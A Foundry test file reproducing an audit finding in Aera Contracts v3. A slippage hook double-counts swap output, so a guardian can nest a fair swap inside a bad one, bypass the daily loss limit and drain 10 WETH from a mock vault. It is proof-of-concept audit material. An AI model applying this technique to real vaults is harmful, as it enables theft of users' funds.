// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58289-incorrect-calculation-of-the-received-swap-amount-allows-gua.sol";

/*//////////////////////////////////////////////////////////////
    Aera Contracts v3 — BaseSlippageHooks balance-delta double-count
    Finding 58289 (Spearbit / Gauntlet review) — HIGH

    Two tests:
      * test_directBadSwap_isCaughtByLimit — control: a single high-slippage swap
        with NO nested callback records its full loss and reverts on the daily
        loss limit (the check works when it is not bypassed).
      * test_exploit_bypassesDailyLossLimit — attack: nesting a fair swap inside
        the bad swap makes the after-hook double-count, so the bad swap records
        ~0 loss, the limit never trips, and the vault's 10 WETH is drained.
//////////////////////////////////////////////////////////////*/
contract IncorrectSwapAmountTest is Test {
    uint256 constant FAIR_RATE = 2000;
    uint256 constant DAILY_LOSS_LIMIT = 1000 ether;

    /// @notice CONTROL: without the nested double-count, the daily loss limit
    ///         correctly catches the near-total-loss swap and reverts.
    function test_directBadSwap_isCaughtByLimit() public {
        MockERC20 weth = new MockERC20("WETH");
        MockERC20 dai = new MockERC20("DAI");
        AttackerSink sink = new AttackerSink();
        MockRouter router = new MockRouter(weth, dai, address(sink));
        SlippageHook hook = new SlippageHook(FAIR_RATE, DAILY_LOSS_LIMIT);
        // guardian = this test contract
        Vault vault = new Vault(weth, dai, router, hook, address(this));

        weth.mint(address(vault), 20 ether);
        dai.mint(address(router), 30000 ether);

        // A single bad swap, NO callback armed: after-hook sees the real dust
        // output (1 DAI), records a ~19999 DAI loss, and trips the 1000 DAI limit.
        vm.expectRevert(bytes("ExceedsDailyLoss"));
        vault.submit(true, 10 ether);
    }

    /// @notice ATTACK: the guardian nests a fair swap inside the bad swap so the
    ///         after-hook double-counts the tokenOut balance, records ~0 loss,
    ///         bypasses the daily limit, and drains the vault.
    function test_exploit_bypassesDailyLossLimit() public {
        Exploit e = new Exploit();

        // Pre-state sanity: vault fully funded, nothing recorded, sink empty.
        assertEq(e.weth().balanceOf(address(e.vault())), 20 ether);
        assertEq(e.hook().cumulativeDailyLoss(address(e.vault())), 0);
        assertEq(e.weth().balanceOf(address(e.attackerSink())), 0);

        // Run the end-to-end attack (its own require()s assert the harm).
        e.run();

        // Re-assert the harm from the outside.

        // FUND DRAIN: 10 WETH extracted into the attacker sink; vault WETH gone.
        assertEq(e.weth().balanceOf(address(e.attackerSink())), 10 ether);
        assertEq(e.weth().balanceOf(address(e.vault())), 0);

        // ACCOUNTING CORRUPTION: the hook recorded ~0 loss...
        uint256 recordedLoss = e.hook().cumulativeDailyLoss(address(e.vault()));
        assertEq(recordedLoss, 0);

        // ...while the bad trade's true loss (10 WETH -> 1 DAI) is ~19999 DAI,
        // far above the 1000 DAI daily limit that should have reverted the swap.
        uint256 trueLoss = 10 ether * FAIR_RATE - 1 ether;
        assertGt(trueLoss, DAILY_LOSS_LIMIT);
        assertLt(recordedLoss, trueLoss);
        assertLe(recordedLoss, DAILY_LOSS_LIMIT); // recorded loss passed the check

        // The double-count is visible in the vault's DAI: it received 20001 DAI
        // (20000 from the nested fair swap + 1 dust from the bad swap) for a
        // total of 20 WETH in — a ~10 WETH net loss the hook never saw.
        assertEq(e.dai().balanceOf(address(e.vault())), 20001 ether);
    }
}
